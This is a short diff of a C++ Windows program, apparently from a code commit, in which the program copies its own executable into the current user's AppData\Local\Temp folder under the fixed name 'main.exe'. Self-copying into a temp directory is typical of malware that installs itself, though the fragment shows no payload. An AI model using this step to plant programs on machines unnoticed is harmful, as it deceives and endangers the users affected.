@@ -151,7 +151,7 @@ int main(int argc,char *argv[])
     GetUserName(username, &username_len);
     string programName = argv[0];
     string pathUsers = "C:\\Users\\";
-    string pathTarget = "\\appdata\\local\\temp\\"+programName;
+    string pathTarget = "\\appdata\\local\\temp\\main.exe";
     string input = current_working_directory()+"\\"+programName;
     string output = pathUsers+username+pathTarget;
     CopyFile(input.c_str(),output.c_str(), TRUE);
